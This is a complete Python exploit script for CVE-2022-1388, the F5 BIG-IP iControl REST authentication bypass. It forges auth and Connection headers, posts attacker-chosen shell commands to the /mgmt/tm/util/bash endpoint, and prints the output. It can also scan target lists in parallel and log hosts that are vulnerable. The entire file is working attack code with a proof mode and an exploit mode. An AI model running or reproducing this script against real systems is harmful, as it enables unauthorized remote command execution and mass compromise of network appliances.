#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

import os
import string
import logging
from random import choice
import sys
import argparse
import requests
import colorama
from concurrent.futures import ThreadPoolExecutor
from requests.adapters import HTTPAdapter, Retry
from urllib.parse import urlparse
import urllib3


colorama.init(autoreset=True)
Fore = colorama.Fore

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1",
    "Content-type": "application/json",
    "Connection": "close, X-F5-Auth-Token, X-Forwarded-For, Local-Ip-From-Httpd, X-F5-New-Authtok-Reqd, X-Forwarded-Server, X-Forwarded-Host",
    "X-F5-Auth-Token": "anything",
    "Authorization": "Basic YWRtaW46"
}

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
session = requests.Session()
session.mount('http', HTTPAdapter(max_retries=Retry(connect=1, read=3)))
session.mount('https', HTTPAdapter(max_retries=Retry(connect=1, read=3)))


def get_randstr(n: int):
    return ''.join([choice(string.ascii_letters) for _ in range(n)])


def get_url_from_target(target):
    if not target.startswith('http'):
        target = f'http://{target}'
    target_parser = urlparse(target)
    netloc = target_parser.netloc
    scheme = target_parser.scheme
    if not netloc:
        logging.error('[-]目标不存在或解析出错')
        return
    return f'{scheme}://{netloc}'


def exploit(url, command):
    global rand_str, headers, proxies, mode
    status = False
    endpoint = "/mgmt/tm/util/bash"

    url = f'{url}{endpoint}'
    payload = {"command": "run", "utilCmdArgs": f"-c '{command}'"}

    try:
        resp = session.post(url, headers=headers,
                            json=payload, proxies=proxies, timeout=15, verify=False)
        if resp.status_code != 200 and 'json' not in resp.headers.get('Content-Type'):
            return url, status
        data = resp.json()
        exec_result = data.get('commandResult').strip() if 'commandResult' in data.keys(
        ) else ''
        if mode == 'poc':
            # poc verified
            return url, f'{rand_str}' == exec_result
        # command execute
        print(exec_result)
        return url, True
    except Exception as e:
        #print(f"[-] {url} Exception: {e}")
        return url, status


def get_command(args):
    global rand_str
    if args.mode == 'exp':
        return args.command or 'whoami'
    return f"echo '{rand_str}'"


def write_success_to_file(args):
    url, status = args.result()
    if not status or not url:
        logging.warning(f'[-] {url.strip()} 不存在漏洞')
        return
    with open('results.txt', 'a+') as f:
        print(f'{Fore.GREEN}[+] {url.strip()} 存在漏洞')
        f.write(f'[+] {url.strip()} 存在漏洞\n')


def load_from_file(filename):
    with open(filename) as f:
        for url in f.readlines():
            url = get_url_from_target(url.strip())
            if not url:
                continue
            yield url


def do_thread(args):
    if not os.path.exists(args.file) or not os.path.isfile(args.file):
        logging.error('target file not exists')
        return
    executor = ThreadPoolExecutor(max_workers=args.threads)
    cmd = get_command(args)
    for url in load_from_file(args.file):
        executor.submit(exploit, url, cmd).add_done_callback(
            write_success_to_file)


def args_parser():
    parser = argparse.ArgumentParser(
        description="CVE-2022-1388 F5 BIG-IP iControl REST Auth Bypass RCE POC, detecting results save to results.txt")
    parser.add_argument('-u', '--url', type=str,
                        help="target url, eg: http://127.0.0.1:8080")
    parser.add_argument('-c', '--command', type=str,
                        help="remote execute command, eg: -c 'whoami'")
    parser.add_argument('-f', '--file', type=str,
                        help="load target urls from file")
    parser.add_argument('-m', '--mode', type=str,
                        default='poc', help='set verify or exploit mode, default poc. eg: -m <poc|exp>')
    parser.add_argument('-t', '--threads', type=int,
                        default=10, help='if set file option, will exploit with threads,default 10. eg: -t 15')

    return parser


rand_str = get_randstr(32)
# flag_str = md5(rand_str.encode()).hexdigest()
# {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
proxies = None


def main():
    global mode
    parser = args_parser()
    args = parser.parse_args()
    mode = args.mode
    if args.command:
        mode = 'exp'
        args.mode = 'exp'
    if not args.url and not args.file:
        parser.print_help()
        sys.exit(1)
    elif args.url:
        url = get_url_from_target(args.url.strip())
        if not url:
            return
        url, status = exploit(url, get_command(args))
        if status:
            print(f'{Fore.GREEN}[+] {url} 存在漏洞')
            return
        print(f'{Fore.YELLOW}[+] {url} 不存在漏洞')

    else:
        do_thread(args)


if __name__ == '__main__':
    main()
